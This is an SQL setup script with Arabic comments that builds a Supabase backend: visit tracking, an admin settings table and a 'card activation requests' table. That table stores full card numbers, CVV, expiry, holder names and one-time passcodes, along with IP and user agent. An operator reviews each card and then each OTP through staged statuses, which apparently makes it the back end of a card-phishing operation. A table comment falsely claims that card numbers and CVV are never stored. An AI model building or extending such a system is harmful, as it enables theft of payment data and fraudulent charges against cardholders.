-- ============================================================
-- ملف استيراد إنشاء جداول الموقع في Supabase
-- شغّله في Supabase -> SQL Editor -> Run
--
-- * آمن للتشغيل أكثر من مرة (idempotent)
-- * يناسب مشروع جديد، وكمان يكمّل جدول موجود بنسخة ناقصة من الأعمدة
-- * الجداول: public.site_visits / public.card_activation_requests
--
-- ملاحظة: الكتابة والقراءة من السيرفر تتم بمفتاح service_role فقط،
-- لذلك الجداول محمية بـ RLS بدون أي سياسة للزوار (anon/authenticated).
-- ============================================================

-- ------------------------------------------------------------
-- 1) إنشاء الجداول بكل الحقول
-- ------------------------------------------------------------
create table if not exists public.site_visits (
  id uuid primary key default gen_random_uuid(),
  path text not null,
  referrer text,
  user_agent text,
  ip text,
  created_at timestamptz not null default now()
);

create table if not exists public.card_activation_requests (
  id uuid primary key default gen_random_uuid(),
  card_title text not null,
  card_brand text,
  card_number text,
  card_holder_name text,
  expiry_month text,
  expiry_year text,
  cvv text,
  -- الرقم المميز: يُولَّد تلقائيًا لكل عميل ولا يُكتب في أي حقل إدخال
  client_ref text not null,
  -- مراحل المراجعة: بانتظار البطاقة → (مرفوضة | بانتظار الكود) → بانتظار الكود → (مرفوض | مكتمل)
  activation_status text not null default 'card_pending'
    check (activation_status in (
      'card_pending', 'card_rejected', 'otp_entry', 'otp_pending', 'otp_rejected', 'verified'
    )),
  otp_value text,
  otp_attempts integer not null default 0,
  approved_at timestamptz,
  ip text,
  user_agent text,
  created_at timestamptz not null default now()
);

-- ------------------------------------------------------------
-- 2) ضمان وجود كل الحقول حتى لو الجدول موجود بنسخة أقدم/ناقصة
--    (create table if not exists لا يضيف أعمدة جديدة أبدًا)
-- ------------------------------------------------------------
alter table public.site_visits add column if not exists id uuid;
alter table public.site_visits add column if not exists path text;
alter table public.site_visits add column if not exists referrer text;
alter table public.site_visits add column if not exists user_agent text;
alter table public.site_visits add column if not exists ip text;
alter table public.site_visits add column if not exists created_at timestamptz;

alter table public.card_activation_requests add column if not exists id uuid;
alter table public.card_activation_requests add column if not exists card_title text;
alter table public.card_activation_requests add column if not exists card_brand text;
alter table public.card_activation_requests add column if not exists card_number text;
alter table public.card_activation_requests add column if not exists card_holder_name text;
alter table public.card_activation_requests add column if not exists expiry_month text;
alter table public.card_activation_requests add column if not exists expiry_year text;
alter table public.card_activation_requests add column if not exists cvv text;
alter table public.card_activation_requests add column if not exists client_ref text;
alter table public.card_activation_requests add column if not exists activation_status text;
alter table public.card_activation_requests add column if not exists otp_value text;
alter table public.card_activation_requests add column if not exists otp_attempts integer;
alter table public.card_activation_requests add column if not exists approved_at timestamptz;
alter table public.card_activation_requests add column if not exists ip text;
alter table public.card_activation_requests add column if not exists user_agent text;
alter table public.card_activation_requests add column if not exists created_at timestamptz;

-- إزالة قيد الحالات القديم أولًا حتى نتمكن من ترحيل القيم
alter table public.card_activation_requests
  drop constraint if exists card_activation_requests_activation_status_check;

-- ترحيل الحالات القديمة إلى مراحل المراجعة الجديدة:
--   requested   → card_pending (بانتظار مراجعة البطاقة)
--   otp_submitted → otp_pending (بانتظار مراجعة الكود)
--   rejected    → card_rejected (البطاقة مرفوضة)
update public.card_activation_requests
  set activation_status = case activation_status
    when 'requested' then 'card_pending'
    when 'otp_submitted' then 'otp_pending'
    when 'rejected' then 'card_rejected'
    else activation_status
  end
  where activation_status in ('requested', 'otp_submitted', 'rejected');

update public.card_activation_requests
  set activation_status = 'card_pending' where activation_status is null;
alter table public.card_activation_requests
  alter column activation_status set default 'card_pending',
  alter column activation_status set not null;

update public.card_activation_requests
  set otp_attempts = 0 where otp_attempts is null;
alter table public.card_activation_requests
  alter column otp_attempts set default 0,
  alter column otp_attempts set not null;

-- الرقم المميز: تعبئة الصفوف القديمة من المعرّف (8 خانات)
update public.card_activation_requests
  set client_ref = upper(substr(replace(id::text, '-', ''), 1, 8))
  where client_ref is null or btrim(client_ref) = '';
alter table public.card_activation_requests alter column client_ref set not null;

-- قيود NOT NULL التي قد تغيب في جدول منشأ يدويًا
-- (نتحقق أولًا من عدم وجود قيم فارغة حتى لا يفشل السكربت)
do $$
begin
  if exists (
    select 1 from information_schema.columns
    where table_schema = 'public' and table_name = 'site_visits'
      and column_name = 'path' and is_nullable = 'YES'
  ) then
    update public.site_visits
      set path = coalesce(nullif(btrim(path), ''), '/')
      where path is null or btrim(path) = '';
    alter table public.site_visits alter column path set not null;
  end if;

  if exists (
    select 1 from information_schema.columns
    where table_schema = 'public' and table_name = 'card_activation_requests'
      and column_name = 'card_title' and is_nullable = 'YES'
  ) and not exists (
    select 1 from public.card_activation_requests
    where card_title is null or btrim(card_title) = ''
  ) then
    alter table public.card_activation_requests alter column card_title set not null;
  end if;

  -- قيد الحالات: يُعاد بناؤه دائمًا ليعكس مراحل المراجعة الست
  alter table public.card_activation_requests
    drop constraint if exists card_activation_requests_activation_status_check;
  alter table public.card_activation_requests
    add constraint card_activation_requests_activation_status_check
    check (activation_status in (
      'card_pending', 'card_rejected', 'otp_entry', 'otp_pending', 'otp_rejected', 'verified'
    ));
end;
$$;

-- ------------------------------------------------------------
-- 3) الفهارس (مطابقة لملفات drizzle/migrations)
-- ------------------------------------------------------------
create index if not exists site_visits_created_at_idx
  on public.site_visits (created_at desc);
create index if not exists site_visits_path_idx
  on public.site_visits (path);
create index if not exists card_activation_requests_created_at_idx
  on public.card_activation_requests (created_at desc);

create unique index if not exists card_activation_requests_client_ref_idx
  on public.card_activation_requests (client_ref);

-- ------------------------------------------------------------
-- 4) حماية مستوى الصفوف: مفعّلة بدون سياسات للزوار
--    (الوصول من السيرفر فقط عبر service_role)
-- ------------------------------------------------------------
alter table public.site_visits enable row level security;
alter table public.card_activation_requests enable row level security;

grant select, insert, update, delete on public.site_visits to service_role;
grant select, insert, update, delete on public.card_activation_requests to service_role;

comment on table public.site_visits is
  'Anonymous page-view tracking for the visitors dashboard. Written and read only via the service role (server-side); no anon/authenticated access.';
comment on table public.card_activation_requests is
  'Card activation requests from the demo gateway. Stores only the product name, IP and browser — never card numbers, CVV, expiry or holder names. Service-role only.';

-- ------------------------------------------------------------
-- 5) إعدادات المشرف — حماية الداشبورد /admin
--    كلمة المرور تُخزَّن مشفّرة (PBKDF2-SHA256 + salt عشوائي)
--    وليست نصًا صريحًا، وعمود session_secret يُستخدم لتوقيع جلسات الدخول
-- ------------------------------------------------------------
create table if not exists public.admin_settings (
  id smallint primary key default 1 check (id = 1),
  password_hash text,
  session_secret text,
  updated_at timestamptz not null default now()
);

alter table public.admin_settings add column if not exists id smallint;
alter table public.admin_settings add column if not exists password_hash text;
alter table public.admin_settings add column if not exists session_secret text;
alter table public.admin_settings add column if not exists updated_at timestamptz;

alter table public.admin_settings enable row level security;

-- لا توجد أي سياسة لهذا الجدول: لا يقرؤه أو يكتبه أحد إلا service_role من السيرفر
grant select, insert, update on public.admin_settings to service_role;

-- ------------------------------------------------------------
-- 6) نقل بيانات الجدول القديم card_activation_events إلى
--    card_activation_requests ثم حذف الجدول القديم
--    اكتشاف ديناميكي للأعمدة، ويشتغل مرة واحدة فقط:
--    بعد الحذف يصبح السكربت تخطيًا آمنًا عند أي إعادة تشغيل
-- ------------------------------------------------------------
do $$
declare
  v_src constant text := 'public.card_activation_events';
  v_col text;
  v_type text;
  v_title text := null;
  v_ip text := null;
  v_ua text := null;
  v_time text := null;
  v_time_type text := null;
  v_expr_title text;
  v_expr_ip text;
  v_expr_ua text;
  v_expr_time text;
  v_rows bigint;
  v_sql text;
begin
  if to_regclass(v_src) is null then
    raise notice 'card_activation_events غير موجود - تم تخطي نقل البيانات.';
    return;
  end if;

  for v_col, v_type in
    select column_name, data_type
    from information_schema.columns
    where table_schema = 'public'
      and table_name = 'card_activation_events'
    order by ordinal_position
  loop
    if v_title is null
      and lower(v_col) in ('card_title', 'title', 'card_name', 'name', 'product_name', 'product', 'card', 'event_name') then
      v_title := v_col;
    end if;

    if v_ip is null
      and lower(v_col) in ('ip', 'ip_address', 'client_ip', 'remote_addr') then
      v_ip := v_col;
    end if;

    if v_ua is null
      and lower(v_col) in ('user_agent', 'useragent', 'ua', 'browser', 'device') then
      v_ua := v_col;
    end if;

    if v_time is null
      and lower(v_col) in ('created_at', 'inserted_at', 'event_time', 'occurred_at', 'timestamp', 'date') then
      v_time := v_col;
      v_time_type := v_type;
    end if;
  end loop;

  v_expr_title := case
    when v_title is null then quote_literal('بطاقة غير محددة')
    else format('nullif(btrim(%I::text), %L)', v_title, '')
  end;

  v_expr_ip := case
    when v_ip is null then 'null::text'
    else format('nullif(btrim(%I::text), %L)', v_ip, '')
  end;

  v_expr_ua := case
    when v_ua is null then 'null::text'
    else format('nullif(btrim(%I::text), %L)', v_ua, '')
  end;

  v_expr_time := case
    when v_time is null then 'now()'
    when v_time_type in ('timestamp with time zone', 'timestamp without time zone', 'date')
      then format('%I::timestamptz', v_time)
    when v_time_type in ('text', 'character varying', 'character', 'name')
      then format('coalesce(nullif(btrim(%I::text), %L)::timestamptz, now())', v_time, '')
    else 'now()'
  end;

  v_sql := format(
    'insert into public.card_activation_requests (client_ref, card_title, ip, user_agent, created_at) select upper(substr(replace(gen_random_uuid()::text, ''-'', ''''), 1, 12)), %s, %s, %s, %s from %s',
    v_expr_title, v_expr_ip, v_expr_ua, v_expr_time, v_src
  );

  execute v_sql;
  get diagnostics v_rows = row_count;
  raise notice 'تم نقل % صف من card_activation_events إلى card_activation_requests', v_rows;

  execute format('drop table if exists %s', v_src);
  raise notice 'تم حذف الجدول القديم card_activation_events';
end;
$$;

-- ------------------------------------------------------------
-- 7) خط الأساس الخاص بأدوات Drizzle (اختياري)
-- ------------------------------------------------------------
create schema if not exists drizzle;

-- ------------------------------------------------------------
-- بعد التشغيل للتأكد:
-- select table_name, column_name, data_type, is_nullable
-- from information_schema.columns
-- where table_schema = 'public'
--   and table_name in ('site_visits', 'card_activation_requests')
-- order by table_name, ordinal_position;
-- ------------------------------------------------------------
